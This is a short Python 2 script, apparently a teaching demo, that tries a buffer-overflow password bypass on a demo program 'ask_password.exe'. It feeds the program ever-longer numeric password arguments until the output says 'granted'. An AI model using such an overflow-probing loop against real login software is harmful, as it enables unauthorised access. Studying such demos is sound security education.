import os
import subprocess

''' This script tries a buffer-overflow attack on
    demo executable 'ask_password.exe'

    It increases the length of the tested password until a successfull
    attack (password bypass) is achieved

    Author: Alex Porto - Aug/2017
'''

path = os.path.abspath(os.path.dirname(__file__))
exe = os.path.join(path, '..', 'bin', 'ask_password.exe')

password = ''
c = '1'
for i in range(100):
    # Increment the password string, char by char
    password += c
    c = chr(ord(c) + 1)
    if c > '9':
        c = '0'

    print "Testing password '%s':" % (password),
    granted = False
    try:
        # Call ask_password.exe, passing the test password as argument
        # and capture the output text
        p = subprocess.Popen([exe, password], shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = p.communicate()

        # If ask_password.exe output contains the text 'granted', the attack
        # is considered successfull
        if 'granted' in output:
            granted = True
    except:
        print "Test failed"

    if granted:
        print "Sucessfull attack!"
        break
    else:
        print "Failed"
